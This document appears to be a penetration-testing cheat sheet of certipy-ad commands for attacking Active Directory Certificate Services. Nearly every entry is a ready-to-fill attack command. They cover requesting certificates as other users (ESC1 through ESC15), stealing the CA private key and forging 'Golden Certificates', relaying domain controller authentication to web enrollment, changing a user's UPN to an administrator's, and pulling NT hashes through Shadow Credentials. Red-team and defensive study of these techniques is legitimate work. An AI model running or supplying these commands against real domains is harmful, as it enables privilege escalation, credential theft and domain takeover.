# certipy-ad

% adcs, certificate, pki, windows, Active directory, template, shadow credential

## certipy-ad - list certificate templates
#plateform/linux #target/remote #cat/RECON
```
certipy-ad find -u <user>@<domain> -p '<password>' -dc-ip <dc-ip> 
```

## certipy-ad - request certificate
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority>
```

## certipy-ad - authenticate with pfx certificate
#plateform/linux #target/remote #cat/CONNECT
```
certipy-ad auth -pfx <pfx-file> -dc-ip <dc-ip>
```

## certipy-ad - authenticate through LDAP (Schannel) with pfx certificate
#plateform/linux #target/remote #cat/CONNECT
```
certipy-ad auth -pfx <pfx-file> -dc-ip <dc-ip> -ldap-shell
```

## certipy-ad - Golden Certificate - steal CA certificate and private key
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad ca -u '<user>@<domain>' -p '<password>' -ns '<nameserver>' -target '<domain>' -config '<NetBIOS-domain-name>\CORP-CA' -backup
```

## certipy-ad - Golden Certificate - forge certificate
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad forge -ca-pfx '<ca-pfx-file>' -upn '<user>@<domain>' -sid '<sid>' -crl 'ldap:///'
```

## certipy-ad - request certificate for another user - ESC1 - ESC6
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority> -upn <targeted-user>@<domain>
```

## certipy-ad - request certificate on behalf of with Certificate Request Agent certificate - ESC3
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad req -u <user>@<domain> -p '<password>' -target <ca-fqdn> -template <template> -ca <certificate-authority> -on-behalf-of '<NetBIOS-domain-name>\<targeted-user>' -pfx <pfx-file>
```

## certipy-ad - modify template in order to make it vulnerable to ESC1 - ESC4
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad template -u <user>@<domain> -p '<password>' -template <template> -save-old
```

## certipy-ad - Issue certificate for specific request id - ESC7
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad ca -u <user>@<domain> -p '<password>' -ca <certificate-authority> -issue-request <csr-id>
```

## certipy-ad - relay authentication to CA Web Enrollment - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad relay -ca <ca-fqdn>
```

## certipy-ad - relay domain controller authentication to CA Web Enrollment - ESC8
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad relay -ca <ca-fqdn> -template 'DomainController'
```

## certipy-ad - Modify user upn to another one - ESC9 - ESC10
#plateform/linux #target/remote #cat/ATTACK
```
certipy-ad account update -u <user>@<domain> -p '<password>' -user <targeted-user> -upn <administrator-user>
```

## certipy-ad - Get NT hash - Shadow Credential
#plateform/linux #target/remote #cat/ATTACK
Full Chain exploit of Shadow Credential: Create a Key Credential, Authenticate to get NT hash and TGT, and remove the Key Credential
```
certipy-ad shadow auto -u <user>@<domain> -p '<password>' -account <targeted-user>
```

## certipy-ad - ESC13
```
certipy-ad req -u "<USER>@<DOMAIN>" -p "<PASSWORD>" -dc-ip "<DC_IP>" -target "<ADCS_HOST>" -ca '<ca_name>' -template '<template>'
```

## certipy-ad - ESC15 step 1
Request a certificate with "Certificate Request Agent" application policy
```
certipy-ad req -u <USER>@<DOMAIN> --application-policies "1.3.6.1.4.1.311.20.2.1" -ca <ca_name> -template <template> -dc-ip <DC_IP>
```

## certipy-ad - ESC15 step 2
Use the certificate in a ESC3 scenario to ask for a new certificate on behalf of another user
```
USE ESC3
```
